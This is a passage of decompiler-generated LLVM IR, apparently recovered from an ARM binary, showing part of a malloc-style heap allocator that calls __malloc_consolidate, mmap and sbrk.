  %v0_166ac = phi i32 [ %v2_16688, %dec_label_pc_1668c.dec_label_pc_16694_crit_edge ], [ %lr.promoted, %dec_label_pc_1668c.preheader ]
  %v0_166d0 = phi i32 [ %v1_16684, %dec_label_pc_1668c.dec_label_pc_16694_crit_edge ], [ %v0_1668456, %dec_label_pc_1668c.preheader ]
  %v1_16694 = add i32 %v0_166d0, 12
  %v2_16694 = inttoptr i32 %v1_16694 to i32*
  %v3_16694 = load i32, i32* %v2_16694, align 4
  store i32 %v3_16694, i32* @ip, align 4
  %v9_16698 = icmp eq i32 %v3_16694, %v0_166d0
  br i1 %v9_16698, label %dec_label_pc_166a0, label %dec_label_pc_166b8

dec_label_pc_166a0:                               ; preds = %dec_label_pc_16694
  %v2_166a0 = sub i32 -1, %v0_166ac
  %v3_166a0 = and i32 %v0_166a0, %v2_166a0
  store i32 %v3_166a0, i32* @r5, align 4
  %v0_166a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_166a4 = load i32, i32* @r6, align 4
  %v4_166a4 = mul i32 %v1_166a4, 4
  %v5_166a4 = add i32 %v4_166a4, %v0_166a4
  store i32 %v5_166a4, i32* %r3.global-to-local, align 4
  %v1_166a8 = add i32 %v0_166d0, 8
  store i32 %v1_166a8, i32* @r4, align 4
  %v2_166ac = mul i32 %v0_166ac, 2
  store i32 %v2_166ac, i32* %lr.global-to-local, align 4
  %v2_166b0 = add i32 %v5_166a4, 820
  %v3_166b0 = inttoptr i32 %v2_166b0 to i32*
  store i32 %v3_166a0, i32* %v3_166b0, align 4
  %v0_16640.pre = load i32, i32* %lr.global-to-local, align 4
  %v1_16648.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16640

dec_label_pc_166b8:                               ; preds = %dec_label_pc_16694
  %v1_166b8 = add i32 %v3_16694, 4
  %v2_166b8 = inttoptr i32 %v1_166b8 to i32*
  %v3_166b8 = load i32, i32* %v2_166b8, align 4
  store i32 %v3_166b8, i32* %r3.global-to-local, align 4
  %v1_166bc = and i32 %v3_166b8, -4
  store i32 %v1_166bc, i32* %r2.global-to-local, align 4
  %v0_166c0 = load i32, i32* @sl, align 4
  %v2_166c0 = sub i32 %v1_166bc, %v0_166c0
  store i32 %v2_166c0, i32* %lr.global-to-local, align 4
  %v1_166c4 = add i32 %v3_16694, 12
  %v2_166c4 = inttoptr i32 %v1_166c4 to i32*
  %v3_166c4 = load i32, i32* %v2_166c4, align 4
  store i32 %v3_166c4, i32* %r3.global-to-local, align 4
  %tmp245 = icmp ult i32 %v2_166c0, 16
  br i1 %tmp245, label %.dec_label_pc_165d0_crit_edge, label %dec_label_pc_166e4.critedge

.dec_label_pc_165d0_crit_edge:                    ; preds = %dec_label_pc_166b8
  %v6_166cc = add i32 %v1_166bc, %v3_16694
  store i32 %v6_166cc, i32* @r2, align 4
  %v2_166d0 = add i32 %v3_166c4, 8
  %v3_166d0 = inttoptr i32 %v2_166d0 to i32*
  store i32 %v0_166d0, i32* %v3_166d0, align 4
  %v0_166d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_166d4 = load i32, i32* @r4, align 4
  %v2_166d4 = add i32 %v1_166d4, 12
  %v3_166d4 = inttoptr i32 %v2_166d4 to i32*
  store i32 %v0_166d4, i32* %v3_166d4, align 4
  %v4_166d8 = load i32, i32* @r2, align 4
  %v5_166d8 = add i32 %v4_166d8, 4
  %v6_166d8 = inttoptr i32 %v5_166d8 to i32*
  %v7_166d8 = load i32, i32* %v6_166d8, align 4
  store i32 %v7_166d8, i32* %r3.global-to-local, align 4
  %v4_166dc = load i32, i32* @ip, align 4
  %v5_166dc = add i32 %v4_166dc, 8
  store i32 %v5_166dc, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_165d0

dec_label_pc_166e4.critedge:                      ; preds = %dec_label_pc_166b8
  %v2_166d0.c = add i32 %v3_166c4, 8
  %v3_166d0.c = inttoptr i32 %v2_166d0.c to i32*
  store i32 %v0_166d0, i32* %v3_166d0.c, align 4
  %v0_166d4.c = load i32, i32* %r3.global-to-local, align 4
  %v1_166d4.c = load i32, i32* @r4, align 4
  %v2_166d4.c = add i32 %v1_166d4.c, 12
  %v3_166d4.c = inttoptr i32 %v2_166d4.c to i32*
  store i32 %v0_166d4.c, i32* %v3_166d4.c, align 4
  %v0_166e4 = load i32, i32* @sl, align 4
  %tmp246 = icmp ult i32 %v0_166e4, 256
  br i1 %tmp246, label %bb171, label %bb172

bb171:                                            ; preds = %dec_label_pc_166e4.critedge
  store i32 ptrtoint (i32* @global_var_3471c.1425 to i32), i32* %r3.global-to-local, align 4
  br label %bb172

bb172:                                            ; preds = %dec_label_pc_166e4.critedge, %bb171
  %v0_166ec = load i32, i32* @ip, align 4
  %v2_166ec = add i32 %v0_166ec, %v0_166e4
  store i32 %v2_166ec, i32* %r1.global-to-local, align 4
  %v1_166f0 = load i32, i32* @r7, align 4
  %v2_166f0 = add i32 %v1_166f0, 8
  %v3_166f0 = inttoptr i32 %v2_166f0 to i32*
  store i32 %v2_166ec, i32* %v3_166f0, align 4
  %v0_166f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_166f4 = load i32, i32* @r7, align 4
  %v2_166f4 = add i32 %v1_166f4, 12
  %v3_166f4 = inttoptr i32 %v2_166f4 to i32*
  store i32 %v0_166f4, i32* %v3_166f4, align 4
  %v0_166f8 = load i32, i32* @r7, align 4
  %v1_166f8 = load i32, i32* %r1.global-to-local, align 4
  %v2_166f8 = add i32 %v1_166f8, 8
  %v3_166f8 = inttoptr i32 %v2_166f8 to i32*
  store i32 %v0_166f8, i32* %v3_166f8, align 4
  %v0_166fc = load i32, i32* @r7, align 4
  %v1_166fc = load i32, i32* %r1.global-to-local, align 4
  %v2_166fc = add i32 %v1_166fc, 12
  %v3_166fc = inttoptr i32 %v2_166fc to i32*
  store i32 %v0_166fc, i32* %v3_166fc, align 4
  %v0_16700 = load i32, i32* @sl, align 4
  %v1_16700 = or i32 %v0_16700, 1
  store i32 %v1_16700, i32* @r2, align 4
  br i1 %tmp246, label %bb173, label %bb174

bb173:                                            ; preds = %bb172
  %v4_16704 = load i32, i32* %r1.global-to-local, align 4
  %v5_16704 = load i32, i32* %r3.global-to-local, align 4
  %v6_16704 = add i32 %v5_16704, 48
  %v7_16704 = inttoptr i32 %v6_16704 to i32*
  store i32 %v4_16704, i32* %v7_16704, align 4
  %v0_16710.pre = load i32, i32* @r2, align 4
  br label %bb174

bb174:                                            ; preds = %bb172, %bb173
  %v0_16710 = phi i32 [ %v1_16700, %bb172 ], [ %v0_16710.pre, %bb173 ]
  %v0_16708 = load i32, i32* @ip, align 4
  %v1_16708 = add i32 %v0_16708, 8
  store i32 %v1_16708, i32* %r4.global-to-local, align 4
  %v0_1670c = load i32, i32* %lr.global-to-local, align 4
  %v1_1670c = or i32 %v0_1670c, 1
  store i32 %v1_1670c, i32* %r3.global-to-local, align 4
  %v2_16710 = add i32 %v0_16708, 4
  %v3_16710 = inttoptr i32 %v2_16710 to i32*
  store i32 %v0_16710, i32* %v3_16710, align 4
  %v0_16714 = load i32, i32* %lr.global-to-local, align 4
  %v1_16714 = load i32, i32* %r1.global-to-local, align 4
  %v3_16714 = add i32 %v1_16714, %v0_16714
  %v4_16714 = inttoptr i32 %v3_16714 to i32*
  store i32 %v0_16714, i32* %v4_16714, align 4
  %v0_16718 = load i32, i32* %r3.global-to-local, align 4
  %v1_16718 = load i32, i32* %r1.global-to-local, align 4
  %v2_16718 = add i32 %v1_16718, 4
  %v3_16718 = inttoptr i32 %v2_16718 to i32*
  store i32 %v0_16718, i32* %v3_16718, align 4
  br label %dec_label_pc_16b20

dec_label_pc_16720.loopexit:                      ; preds = %dec_label_pc_16658
  br label %dec_label_pc_16720

dec_label_pc_16720:                               ; preds = %dec_label_pc_16720.loopexit, %dec_label_pc_1638c, %dec_label_pc_16394
  store i32 ptrtoint (i32* @global_var_3471c.1425 to i32), i32* @r0, align 4
  %v3_16724 = load i32, i32* @global_var_34748.1431, align 4
  store i32 %v3_16724, i32* @ip, align 4
  %v1_16728 = add i32 %v3_16724, 4
  %v2_16728 = inttoptr i32 %v1_16728 to i32*
  %v3_16728 = load i32, i32* %v2_16728, align 4
  %v0_1672c = load i32, i32* @sl, align 4
  %v1_1672c = add i32 %v0_1672c, 16
  store i32 %v1_1672c, i32* %r2.global-to-local, align 4
  %v1_16730 = and i32 %v3_16728, -4
  store i32 %v1_16730, i32* %r3.global-to-local, align 4
  %v3_16734 = icmp ult i32 %v1_16730, %v1_1672c
  br i1 %v3_16734, label %dec_label_pc_16764, label %dec_label_pc_16740

dec_label_pc_16740:                               ; preds = %dec_label_pc_16720
  %v2_16740 = sub i32 %v1_16730, %v0_1672c
  %v2_16744 = add i32 %v0_1672c, %v3_16724
  store i32 %v2_16744, i32* %r1.global-to-local, align 4
  %v1_16748 = or i32 %v2_16740, 1
  store i32 %v1_16748, i32* %r3.global-to-local, align 4
  %v1_1674c = or i32 %v0_1672c, 1
  store i32 %v1_1674c, i32* @r2, align 4
  %v1_16750 = add i32 %v3_16724, 8
  store i32 %v1_16750, i32* %r4.global-to-local, align 4
  store i32 %v1_1674c, i32* %v2_16728, align 4
  %v0_16758 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_16758, i32* @global_var_34748.1431, align 4
  %v0_1675c = load i32, i32* %r3.global-to-local, align 4
  %v2_1675c = add i32 %v0_16758, 4
  %v3_1675c = inttoptr i32 %v2_1675c to i32*
  store i32 %v0_1675c, i32* %v3_1675c, align 4
  br label %dec_label_pc_16b20

dec_label_pc_16764:                               ; preds = %dec_label_pc_16720
  %v2_16764 = load i32, i32* @global_var_3471c.1425, align 4
  store i32 %v2_16764, i32* %r3.global-to-local, align 4
  %v1_16768 = and i32 %v2_16764, 2
  store i32 %v1_16768, i32* @ip, align 4
  %v2_16768 = icmp eq i32 %v1_16768, 0
  %v3_1676c = load i32, i32* @global_var_34a78.1432, align 4
  store i32 %v3_1676c, i32* %r1.global-to-local, align 4
  br i1 %v2_16768, label %dec_label_pc_16784, label %dec_label_pc_16774

dec_label_pc_16774:                               ; preds = %dec_label_pc_16764
  %v0_16774 = call i32 @__malloc_consolidate()
  %v0_16778 = load i32, i32* @sl, align 4
  %v1_16778 = add i32 %v0_16778, -7
  store i32 %v1_16778, i32* %r0.global-to-local, align 4
  %v1_1677c = call i32 @malloc(i32 %v1_16778)
  store i32 %v1_1677c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16b1c

dec_label_pc_16784:                               ; preds = %dec_label_pc_16764
  %v3_16784 = load i32, i32* @global_var_34a68.1433, align 4
  store i32 %v3_16784, i32* %r3.global-to-local, align 4
  %v3_16788 = icmp ult i32 %v0_1672c, %v3_16784
  %v1_1678c = add i32 %v3_1676c, -1
  store i32 %v1_1678c, i32* %sb.global-to-local, align 4
  br i1 %v3_16788, label %dec_label_pc_16858, label %dec_label_pc_16794

dec_label_pc_16794:                               ; preds = %dec_label_pc_16784
  %v3_16794 = load i32, i32* @global_var_34a70.1434, align 4
  store i32 %v3_16794, i32* %r2.global-to-local, align 4
  %v3_16798 = load i32, i32* @global_var_34a6c.1435, align 4
  store i32 %v3_16798, i32* %r3.global-to-local, align 4
  %v6_167a0 = icmp slt i32 %v3_16798, %v3_16794
  br i1 %v6_167a0, label %dec_label_pc_167a4, label %dec_label_pc_16858

dec_label_pc_167a4:                               ; preds = %dec_label_pc_16794
  %v1_167a4 = add i32 %v0_1672c, 10
  %v2_167a8 = add i32 %v1_167a4, %v3_1676c
  store i32 %v2_167a8, i32* %r3.global-to-local, align 4
  %v2_167ac = sub i32 0, %v3_1676c
  %v3_167ac = and i32 %v2_167a8, %v2_167ac
  store i32 %v3_167ac, i32* @r4, align 4
  %tmp247 = icmp ugt i32 %v3_167ac, %v0_1672c
  br i1 %tmp247, label %dec_label_pc_167b8, label %dec_label_pc_16858

dec_label_pc_167b8:                               ; preds = %dec_label_pc_167a4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_167ac, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_167d0 = call i32 @mmap(i32 0, i32 %v3_167ac, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_167d0, i32* %r0.global-to-local, align 4
  %v7_167d4 = icmp eq i32 %v6_167d0, -1
  br i1 %v7_167d4, label %dec_label_pc_167b8.dec_label_pc_16858_crit_edge, label %dec_label_pc_167dc

dec_label_pc_167b8.dec_label_pc_16858_crit_edge:  ; preds = %dec_label_pc_167b8
  %v3_1685c.pre = load i32, i32* @global_var_34748.1431, align 4
  %v1_16874.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_16858

dec_label_pc_167dc:                               ; preds = %dec_label_pc_167b8
  %v1_167dc = urem i32 %v6_167d0, 8
  store i32 %v1_167dc, i32* %r2.global-to-local, align 4
  %v2_167dc = icmp eq i32 %v1_167dc, 0
  br i1 %v2_167dc, label %bb175, label %.thread25

.thread25:                                        ; preds = %dec_label_pc_167dc
  %v2_167e0 = sub nsw i32 8, %v1_167dc
  store i32 %v2_167e0, i32* %r3.global-to-local, align 4
  %v2_167e4 = load i32, i32* @r4, align 4
  %v3_167e4 = sub i32 %v2_167e4, %v2_167e0
  %v3_167e8 = add i32 %v2_167e0, %v6_167d0
  store i32 %v3_167e8, i32* %lr.global-to-local, align 4
  %v2_167f0 = or i32 %v3_167e4, 2
  store i32 %v2_167f0, i32* %r2.global-to-local, align 4
  %v5_167f8 = inttoptr i32 %v3_167e8 to i32*
  store i32 %v2_167e0, i32* %v5_167f8, align 4
  %v1_167fc = load i32, i32* %r2.global-to-local, align 4
  %v2_167fc = load i32, i32* %lr.global-to-local, align 4
  %v3_167fc = add i32 %v2_167fc, 4
  %v4_167fc = inttoptr i32 %v3_167fc to i32*
  store i32 %v1_167fc, i32* %v4_167fc, align 4
  br label %.thread27

bb175:                                            ; preds = %dec_label_pc_167dc
  store i32 %v6_167d0, i32* %lr.global-to-local, align 4
  %v1_167f449 = load i32, i32* @r4, align 4
  %v2_167f450 = or i32 %v1_167f449, 2
  store i32 %v2_167f450, i32* %r3.global-to-local, align 4
  %v3_16800 = inttoptr i32 %v6_167d0 to i32*
  store i32 0, i32* %v3_16800, align 4
  %v1_16804 = load i32, i32* %r3.global-to-local, align 4
  %v2_16804 = load i32, i32* %lr.global-to-local, align 4
  %v3_16804 = add i32 %v2_16804, 4
  %v4_16804 = inttoptr i32 %v3_16804 to i32*
  store i32 %v1_16804, i32* %v4_16804, align 4
  br label %.thread27

.thread27:                                        ; preds = %.thread25, %bb175
  store i32 ptrtoint (i32* @global_var_3471c.1425 to i32), i32* @ip, align 4
  %v3_1680c = load i32, i32* @global_var_34a6c.1435, align 4
  %v3_16810 = load i32, i32* @global_var_34a74.1437, align 4
  store i32 %v3_16810, i32* %r2.global-to-local, align 4
  %v1_16814 = add i32 %v3_1680c, 1
  store i32 %v1_16814, i32* %r3.global-to-local, align 4
  %v7_1681c = icmp sgt i32 %v1_16814, %v3_16810
  br i1 %v7_1681c, label %bb176, label %bb177

bb176:                                            ; preds = %.thread27
  store i32 %v1_16814, i32* @global_var_34a74.1437, align 4
  br label %bb177

bb177:                                            ; preds = %.thread27, %bb176
  store i32 %v1_16814, i32* @global_var_34a6c.1435, align 4
  %v3_16824 = load i32, i32* @global_var_34a80.1438, align 4
  %v3_16828 = load i32, i32* @global_var_34a8c.1439, align 4
  %v0_1682c = load i32, i32* @r4, align 4
  %v2_1682c = add i32 %v0_1682c, %v3_16824
  store i32 %v2_1682c, i32* %r1.global-to-local, align 4
  %v3_16830 = load i32, i32* @global_var_34a84.1440, align 4
  store i32 %v3_16830, i32* %r3.global-to-local, align 4
  %v3_16838 = load i32, i32* @global_var_34a90.1441, align 4
  store i32 %v3_16838, i32* @r2, align 4
  %tmp248 = icmp ugt i32 %v2_1682c, %v3_16828
  br i1 %tmp248, label %bb178, label %bb179

bb178:                                            ; preds = %bb177
  store i32 %v2_1682c, i32* @global_var_34a8c.1439, align 4
  br label %bb179

bb179:                                            ; preds = %bb177, %bb178
  store i32 %v2_1682c, i32* @global_var_34a80.1438, align 4
  %v2_16844 = add i32 %v3_16830, %v2_1682c
  store i32 %v2_16844, i32* %r1.global-to-local, align 4
  %v0_1684c = load i32, i32* %lr.global-to-local, align 4
  %v1_1684c = add i32 %v0_1684c, 8
  store i32 %v1_1684c, i32* %r0.global-to-local, align 4
  %tmp249 = icmp ugt i32 %v2_16844, %v3_16838
  br i1 %tmp249, label %bb180, label %dec_label_pc_16b1c

bb180:                                            ; preds = %bb179
  store i32 %v2_16844, i32* @global_var_34a90.1441, align 4
  br label %dec_label_pc_16b1c

dec_label_pc_16858:                               ; preds = %dec_label_pc_167a4, %dec_label_pc_16784, %dec_label_pc_167b8.dec_label_pc_16858_crit_edge, %dec_label_pc_16794
  %v1_16874 = phi i32 [ %v1_16874.pre, %dec_label_pc_167b8.dec_label_pc_16858_crit_edge ], [ %v0_1672c, %dec_label_pc_16794 ], [ %v0_1672c, %dec_label_pc_16784 ], [ %v0_1672c, %dec_label_pc_167a4 ]
  %v2_16944 = phi i32 [ %v3_1685c.pre, %dec_label_pc_167b8.dec_label_pc_16858_crit_edge ], [ %v3_16724, %dec_label_pc_16794 ], [ %v3_16724, %dec_label_pc_16784 ], [ %v3_16724, %dec_label_pc_167a4 ]
  store i32 %v2_16944, i32* %r0.global-to-local, align 4
  %v3_16860 = load i32, i32* @global_var_34a7c.1442, align 4
  store i32 %v3_16860, i32* @r2, align 4
  %v3_16864 = load i32, i32* @global_var_34a64.1443, align 4
  store i32 %v3_16864, i32* %r3.global-to-local, align 4
  %v1_16868 = add i32 %v2_16944, 4
  %v2_16868 = inttoptr i32 %v1_16868 to i32*
  %v3_16868 = load i32, i32* %v2_16868, align 4
  store i32 %v3_16868, i32* %r1.global-to-local, align 4
  %v1_16870 = urem i32 %v3_16860, 2
  %v2_16870 = icmp eq i32 %v1_16870, 0
  %v1_1686c = add i32 %v1_16874, 16
  %v2_16874 = add i32 %v1_1686c, %v3_16864
  store i32 %v2_16874, i32* %r3.global-to-local, align 4
  %v1_16878 = and i32 %v3_16868, -4
  store i32 %v1_16878, i32* %r8.global-to-local, align 4
  br i1 %v2_16870, label %bb182, label %bb181

bb181:                                            ; preds = %dec_label_pc_16858
  %v3_1687c = sub i32 %v2_16874, %v1_16878
  store i32 %v3_1687c, i32* %r3.global-to-local, align 4
  br label %bb182

bb182:                                            ; preds = %dec_label_pc_16858, %bb181
  %v0_16880 = phi i32 [ %v2_16874, %dec_label_pc_16858 ], [ %v3_1687c, %bb181 ]
  %v1_16880 = load i32, i32* %sb.global-to-local, align 4
  %v2_16880 = add i32 %v1_16880, %v0_16880
  store i32 %v2_16880, i32* %r3.global-to-local, align 4
  %v1_16884 = sub i32 -1, %v1_16880
  store i32 %v1_16884, i32* %fp.global-to-local, align 4
  %v2_16888 = and i32 %v2_16880, %v1_16884
  store i32 %v2_16888, i32* @r5, align 4
  %tmp183 = icmp slt i32 %v2_16888, 1
  br i1 %tmp183, label %dec_label_pc_168ac, label %dec_label_pc_16898

dec_label_pc_16898:                               ; preds = %bb182
  store i32 %v2_16888, i32* %r0.global-to-local, align 4
  %v1_1689c = call i32 @__GI_sbrk(i32 %v2_16888)
  store i32 %v1_1689c, i32* %r0.global-to-local, align 4
  %v3_168a0 = icmp eq i32 %v1_1689c, -1
  store i32 %v1_1689c, i32* @r4, align 4
  br i1 %v3_168a0, label %dec_label_pc_16898.dec_label_pc_168ac_crit_edge, label %dec_label_pc_16910

dec_label_pc_16898.dec_label_pc_168ac_crit_edge:  ; preds = %dec_label_pc_16898
  %v3_168b0.pre = load i32, i32* @global_var_34a7c.1442, align 4
  br label %dec_label_pc_168ac

dec_label_pc_168ac:                               ; preds = %dec_label_pc_16898.dec_label_pc_168ac_crit_edge, %bb182
  %v3_168b0 = phi i32 [ %v3_168b0.pre, %dec_label_pc_16898.dec_label_pc_168ac_crit_edge ], [ %v3_16860, %bb182 ]
  store i32 ptrtoint (i32* @global_var_3471c.1425 to i32), i32* %r6.global-to-local, align 4
  store i32 %v3_168b0, i32* %r3.global-to-local, align 4
  %v1_168b4 = urem i32 %v3_168b0, 2
  %v2_168b4 = icmp eq i32 %v1_168b4, 0
  br i1 %v2_168b4, label %.thread29thread-pre-split, label %bb184

bb184:                                            ; preds = %dec_label_pc_168ac
  %v1_168b8 = load i32, i32* %r8.global-to-local, align 4
  %v2_168b8 = load i32, i32* %sb.global-to-local, align 4
  %v3_168b8 = add i32 %v2_168b8, %v1_168b8
  %v2_168bc = load i32, i32* @r5, align 4
  %v3_168bc = add i32 %v3_168b8, %v2_168bc
  store i32 %v3_168bc, i32* %r3.global-to-local, align 4
  %v2_168c0 = load i32, i32* %fp.global-to-local, align 4
  %v3_168c0 = and i32 %v2_168c0, %v3_168bc
  store i32 %v3_168c0, i32* @r5, align 4
  br label %.thread29

.thread29thread-pre-split:                        ; preds = %dec_label_pc_168ac
  %v0_168c4.pr = load i32, i32* @r5, align 4
  br label %.thread29

.thread29:                                        ; preds = %.thread29thread-pre-split, %bb184
  %v0_168c4 = phi i32 [ %v0_168c4.pr, %.thread29thread-pre-split ], [ %v3_168c0, %bb184 ]
  %v2_168c4 = icmp ugt i32 %v0_168c4, 1048575
  br i1 %v2_168c4, label %bb186, label %bb185

bb185:                                            ; preds = %.thread29
  store i32 1048576, i32* @r5, align 4
  br label %bb186

bb186:                                            ; preds = %.thread29, %bb185
  %v0_168dc = phi i32 [ %v0_168c4, %.thread29 ], [ 1048576, %bb185 ]
  %v1_168cc = load i32, i32* @sl, align 4
  %tmp250 = icmp ugt i32 %v0_168dc, %v1_168cc
  br i1 %tmp250, label %dec_label_pc_168d4, label %dec_label_pc_16b0c

dec_label_pc_168d4:                               ; preds = %bb186
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_168dc, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_168f0 = call i32 @mmap(i32 0, i32 %v0_168dc, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_168f0, i32* %r0.global-to-local, align 4
  %v3_168f4 = icmp eq i32 %v6_168f0, -1
  %v8_168f4 = icmp eq i32 %v6_168f0, -1
  store i32 %v6_168f0, i32* @r4, align 4
  br i1 %v8_168f4, label %.thread32, label %bb187

bb187:                                            ; preds = %dec_label_pc_168d4
  %v4_168fc = load i32, i32* @global_var_34a7c.1442, align 4
  %v2_16900 = load i32, i32* @r5, align 4
  %v3_16900 = add i32 %v2_16900, %v6_168f0
  store i32 %v3_16900, i32* %r0.global-to-local, align 4
  %v2_16904 = and i32 %v4_168fc, -2
  store i32 %v2_16904, i32* %r3.global-to-local, align 4
  store i32 %v2_16904, i32* @global_var_34a7c.1442, align 4
  br label %.thread32

.thread32:                                        ; preds = %dec_label_pc_168d4, %bb187
  %v1_16934128 = phi i32 [ %v6_168f0, %dec_label_pc_168d4 ], [ %v3_16900, %bb187 ]
  br i1 %v3_168f4, label %dec_label_pc_16910, label %dec_label_pc_16914

dec_label_pc_16910:                               ; preds = %.thread32, %dec_label_pc_16898
  %v0_16964235 = phi i32 [ -1, %.thread32 ], [ %v1_1689c, %dec_label_pc_16898 ]
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16914

dec_label_pc_16914:                               ; preds = %.thread32, %dec_label_pc_16910
  %v0_16a28.pre = phi i32 [ %v6_168f0, %.thread32 ], [ %v0_16964235, %dec_label_pc_16910 ]
  %v0_16a04 = phi i32 [ %v1_16934128, %.thread32 ], [ -1, %dec_label_pc_16910 ]
  %v7_16914 = icmp eq i32 %v0_16a28.pre, -1
  br i1 %v7_16914, label %dec_label_pc_16b0c, label %dec_label_pc_1691c

dec_label_pc_1691c:                               ; preds = %dec_label_pc_16914
  store i32 ptrtoint (i32* @global_var_3471c.1425 to i32), i32* %ip.global-to-local, align 4
  store i32 %v2_16944, i32* %r2.global-to-local, align 4
  %v3_16924 = load i32, i32* @global_var_34a84.1440, align 4
  %v1_16928 = load i32, i32* %r8.global-to-local, align 4
  %v2_16928 = add i32 %v1_16928, %v2_16944
  store i32 %v2_16928, i32* %r1.global-to-local, align 4
  %v0_1692c = load i32, i32* @r5, align 4
  %v2_1692c = add i32 %v0_1692c, %v3_16924
  store i32 %v2_1692c, i32* %r3.global-to-local, align 4
  %v9_16930 = icmp eq i32 %v0_16a28.pre, %v2_16928
  br i1 %v9_16930, label %bb188, label %bb189

bb188:                                            ; preds = %dec_label_pc_1691c
  %v8_16934 = icmp eq i32 %v0_16a04, -1
  store i32 %v2_1692c, i32* @global_var_34a84.1440, align 4
  br i1 %v8_16934, label %.thread36, label %dec_label_pc_1694c

bb189:                                            ; preds = %dec_label_pc_1691c
  store i32 %v2_1692c, i32* @global_var_34a84.1440, align 4
  br label %dec_label_pc_1694c

.thread36:                                        ; preds = %bb188
  %v3_1693c = add i32 %v0_1692c, %v1_16928
  %v2_16940 = or i32 %v3_1693c, 1
  store i32 %v2_16940, i32* %r3.global-to-local, align 4
  store i32 %v2_16940, i32* %v2_16868, align 4
  br label %dec_label_pc_16aa8

dec_label_pc_1694c:                               ; preds = %bb189, %bb188
  %v3_1694c = load i32, i32* @global_var_34a7c.1442, align 4
  store i32 %v3_1694c, i32* %r2.global-to-local, align 4
  %v2_16950 = icmp eq i32 %v1_16928, 0
  br i1 %v2_16950, label %.thread39, label %.thread38

.thread39:                                        ; preds = %dec_label_pc_1694c
  store i32 0, i32* %r3.global-to-local, align 4
  br label %.thread42

.thread38:                                        ; preds = %dec_label_pc_1694c
  %v2_16958 = urem i32 %v3_1694c, 2
  store i32 %v2_16958, i32* %r3.global-to-local, align 4
  %v2_1695c = icmp eq i32 %v2_16958, 0
  br i1 %v2_1695c, label %.thread42, label %dec_label_pc_16964

dec_label_pc_16964:                               ; preds = %.thread38
  %v3_16964 = icmp ult i32 %v0_16a28.pre, %v2_16928
  br i1 %v3_16964, label %bb190, label %.thread42

bb190:                                            ; preds = %dec_label_pc_16964
  %v2_16968 = and i32 %v3_1694c, -2
  store i32 %v2_16968, i32* %r3.global-to-local, align 4
  store i32 %v2_16968, i32* @global_var_34a7c.1442, align 4
  br label %.thread42

.thread42:                                        ; preds = %dec_label_pc_16964, %.thread39, %.thread38, %bb190
  %v3_16974 = phi i32 [ %v3_1694c, %dec_label_pc_16964 ], [ %v3_1694c, %.thread39 ], [ %v3_1694c, %.thread38 ], [ %v2_16968, %bb190 ]
  store i32 ptrtoint (i32* @global_var_3471c.1425 to i32), i32* @r7, align 4
  store i32 %v3_16974, i32* %r3.global-to-local, align 4
  %v1_16978 = urem i32 %v3_16974, 2
  store i32 %v1_16978, i32* %r6.global-to-local, align 4
  %v2_16978 = icmp eq i32 %v1_16978, 0
  br i1 %v2_16978, label %dec_label_pc_16a04, label %dec_label_pc_16980

dec_label_pc_16980:                               ; preds = %.thread42
  br i1 %v2_16950, label %.thread45, label %bb191

bb191:                                            ; preds = %dec_label_pc_16980
  store i32 %v2_1692c, i32* %r2.global-to-local, align 4
  %v3_16988 = sub i32 %v0_16a28.pre, %v2_16928
  %v3_1698c = add i32 %v3_16988, %v2_1692c
  store i32 %v3_1698c, i32* %r3.global-to-local, align 4
  store i32 %v3_1698c, i32* @global_var_34a84.1440, align 4
  br label %.thread45

.thread45:                                        ; preds = %dec_label_pc_16980, %bb191
  %v1_16994 = urem i32 %v0_16a28.pre, 8
  store i32 %v1_16994, i32* %r3.global-to-local, align 4
  %v2_16994 = icmp eq i32 %v1_16994, 0
  br i1 %v2_16994, label %.thread46, label %bb192

bb192:                                            ; preds = %.thread45
  %v2_16998 = sub nsw i32 8, %v1_16994
  store i32 %v2_16998, i32* %r3.global-to-local, align 4
  %v3_1699c = add i32 %v2_16998, %v0_16a28.pre
  store i32 %v3_1699c, i32* @r7, align 4
  br label %.thread46

.thread46:                                        ; preds = %.thread45, %bb192
  %v0_169a4 = phi i32 [ 0, %.thread45 ], [ %v2_16998, %bb192 ]
  %v2_169a0 = add i32 %v0_1692c, %v0_16a28.pre
  store i32 %v2_169a0, i32* %r6.global-to-local, align 4
  %v2_169a4 = add i32 %v0_169a4, %v1_16928
  %v2_169a8 = add i32 %v2_169a4, %v2_169a0
  store i32 %v2_169a8, i32* %r1.global-to-local, align 4
  %v1_169ac = load i32, i32* %sb.global-to-local, align 4
  %v2_169ac = add i32 %v1_169ac, %v2_169a8
  %v1_169b0 = load i32, i32* %fp.global-to-local, align 4
  %v2_169b0 = and i32 %v1_169b0, %v2_169ac
  store i32 %v2_169b0, i32* %r2.global-to-local, align 4
  %v2_169b4 = sub i32 0, %v2_169a0
  store i32 %v2_169b4, i32* %r3.global-to-local, align 4
  %v2_169b8 = sub i32 %v2_169b0, %v2_169a0
  store i32 %v2_169b8, i32* @r5, align 4
  store i32 %v2_169b8, i32* %r0.global-to-local, align 4
  br i1 %v2_16994, label %bb193, label %bb194

bb193:                                            ; preds = %.thread46
  store i32 %v0_16a28.pre, i32* @r7, align 4
  br label %bb194

bb194:                                            ; preds = %.thread46, %bb193
  %v1_169c4 = call i32 @__GI_sbrk(i32 %v2_169b8)
  store i32 %v1_169c4, i32* %r0.global-to-local, align 4
  %v3_169c8 = icmp eq i32 %v1_169c4, -1
  br i1 %v3_169c8, label %dec_label_pc_169d0, label %dec_label_pc_169e0

dec_label_pc_169d0:                               ; preds = %bb194
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_169d4 = call i32 @__GI_sbrk(i32 0)
